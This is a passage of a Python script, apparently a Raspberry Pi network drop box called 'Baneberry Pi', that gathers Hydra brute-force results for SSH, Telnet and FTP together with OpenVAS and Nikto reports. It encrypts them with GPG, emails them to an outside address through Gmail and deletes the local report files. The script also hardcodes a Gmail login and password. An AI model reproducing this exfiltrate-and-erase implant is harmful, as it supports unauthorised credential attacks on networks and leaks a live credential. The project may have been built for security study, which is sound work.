       ADD_WEBSERVER_NMAP_INFO = subprocess.Popen("cat reports/hydra_ssh_results.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]

    if TELNET_HOSTS_FOUND == 1:
       FINAL_REPORT = open("reports/final_report.txt","a")
       FINAL_REPORT.write("Hydra Telnet attack Results:\n\n")       
       FINAL_REPORT.close()
       ADD_WEBSERVER_NMAP_INFO = subprocess.Popen("cat reports/hydra_telnet_results.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]     

    if FTP_HOSTS_FOUND == 1:
       FINAL_REPORT = open("reports/final_report.txt","a")
       FINAL_REPORT.write("Hydra FTP attack Results:\n\n")       
       FINAL_REPORT.close()
       ADD_WEBSERVER_NMAP_INFO = subprocess.Popen("cat reports/hydra_ftp_results.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]

    if DEEP_STARTED == 1:
       FINAL_REPORT = open("reports/final_report.txt","a")
       FINAL_REPORT.write("\n\n\n================================================================\n")
       FINAL_REPORT.write("Openvas Report:\n")
       FINAL_REPORT.close()
       ADD_OPENVAS_REPORT = subprocess.Popen("cat reports/report_openvas.txt >> reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]
    
    ENCRYPTED_FILENAME = "encrypted_" + datetime.datetime.now().strftime("%d_%B_%I_%M%p") + ".txt"
    
    ENCRYPT_REPORT = subprocess.Popen("gpg --output reports/" + ENCRYPTED_FILENAME + " --encrypt --recipient Mironovs reports/final_report.txt", shell=True, stdout=subprocess.PIPE).communicate()[0]    

    if INET_CONNECTION == 1:
       print "Sending the report." 
       send_report()

    clean_up() 
       
def send_report():
    print "Compiling the report."
    msg = MIMEMultipart()
    SCANATK_TYPE = ""
    if QUICK_STARTED == 1:
       SCANATK_TYPE = "Quick"
    if DEEP_STARTED == 1:
       SCANATK_TYPE = "Deep"

    msg['Subject'] = (SCANATK_TYPE + " scan/attack completed on " + TIMESTAMP_END)  
    msg['From'] = 'baneberry.pi@gmail.com'
    msg['To'] = 'rmiron10@caledonian.ac.uk'

    # This is the textual part:
    part = MIMEText(SCANATK_TYPE + " scan/attack completed on " + TIMESTAMP_END) 
    msg.attach(part)

    # This is the attachment):
    part = MIMEApplication(open("reports/" + ENCRYPTED_FILENAME,"rb").read())
    part.add_header('Content-Disposition', 'attachment', filename= ENCRYPTED_FILENAME)
    msg.attach(part)

    # Create an instance in SMTP server
    smtp = smtplib.SMTP("smtp.gmail.com:587")
    smtp.ehlo()

    smtp.starttls()
    smtp.login("baneberry.pi@gmail.com", "ban3berryp1")

    # Send the email
    smtp.sendmail(msg['From'], msg['To'], msg.as_string())
    print "Report sent."

    clean_up()


def clean_up():
   
    try:
        os.remove("tmp/webservers")
        os.remove("tmp/webservers_nmap_no_dups")
    except OSError:
        pass

    try:
        os.remove("tmp/TCP_PORT_RESULTS")
    except OSError:
        pass
    
    try:
        os.remove("tmp/report_base64.txt")
        os.remove("tmp/report_raw.txt")
    except OSError:
        pass
    
    try:
        os.remove("reports/final_report.txt")
    except OSError:
        pass
    
    try:
        os.remove("reports/nikto_results.txt")
        os.remove("reports/nmap_webserver_attack.txt")
    except OSError:
        pass
    
    try:
        os.remove("reports/tcp_port_report.txt")
    except OSError:
        pass

    try:
        os.remove("reports/udp_port_report.txt")
        os.remove("reports/report_openvas.txt")
    except OSError:
        pass

    try:
        os.remove("reports/hydra_ssh_results.txt") 
    except OSError:
        pass
    
    try:
        os.remove("reports/hydra_ftp_results.txt") 
    except OSError:
        pass
    
    try:
        os.remove("reports/hydra_telnet_results.txt") 
    except OSError:
        pass

########Script starts from here#########
lcd = LCD.Adafruit_CharLCDPlate()

print """
______                  _                                      _ 
| ___ \                | |                                    (_)
| |_/ / __ _ _ __   ___| |__   ___ _ __ _ __ _   _       _ __  _ 
| ___ \/ _` | '_ \ / _ \ '_ \ / _ \ '__| '__| | | |     | '_ \| |
| |_/ / (_| | | | |  __/ |_) |  __/ |  | |  | |_| |     | |_) | |
\____/ \__,_|_| |_|\___|_.__/ \___|_|  |_|   \__, |     | .__/|_|
                                              __/ |_____| |      
 by Roman Mironov                            |___/______|_|      
"""

#raw_input("Press Enter to start")

global QUICK_COMPLETED
global DEEP_COMPLETED
global QUICK_STARTED
global DEEP_STARTED

QUICK_STARTED = 0
DEEP_STARTED = 0
QUICK_COMPLETED = 'No'
DEEP_COMPLETED = 'No'              

lcd.clear()
lcd.set_color(0.0, 1.0, 0.0)
lcd.message('Baneberry Pi\nPress SELECT')
i = 0
while not lcd.is_pressed(LCD.SELECT):
    i = (i + 1) % 200
    if i == 0:
        lcd.clear()
        lcd.message ('Baneberry Pi\nPress SELECT')
    elif i == 100:
        lcd.clear()
        lcd.message ('Baneberry Pi')
    sleep(0.01)

print "Initializing..."
lcd.clear()
lcd.set_color(1.0, 1.0, 1.0)
lcd.message ('Initializing...')
sleep (2)
#command run
# = subprocess.Popen(" ", shell=True, stdout=subprocess.PIPE).communicate()[0]

#Get Script Directory
SCRIPT_DIR = os.getcwd()

if not os.path.exists(SCRIPT_DIR + '/tmp'):
    os.makedirs(SCRIPT_DIR + '/tmp')

if not os.path.exists(SCRIPT_DIR + '/reports'):
    os.makedirs(SCRIPT_DIR + '/reports')


#Check if Ethernet cable is connected
print "Checking if ethernet cable connected..."
ETH_CHECK = subprocess.Popen("ethtool eth0 | grep \"Link detected:\" | cut -f2 -d :", shell=True, stdout=subprocess.PIPE).communicate()[0]
ETH_CHECK = ETH_CHECK.rstrip()
while 'no' in ETH_CHECK:
   print "Ethernet cable not connected"
   lcd.clear()
   lcd.set_color(1.0, 0.0, 0.0)
   lcd.message('Ethernet Cable\nNot Connected!')
   sleep(5)
   ETH_CHECK = subprocess.Popen("ethtool eth0 | grep \"Link detected:\" | cut -f2 -d :", shell=True, stdout=subprocess.PIPE).communicate()[0]
   ETH_CHECK = ETH_CHECK.rstrip()
   sleep(5)
   
   if 'yes' in ETH_CHECK:
      print "Ethernet cable connected!"
      break

reconaissance()
main_menu()

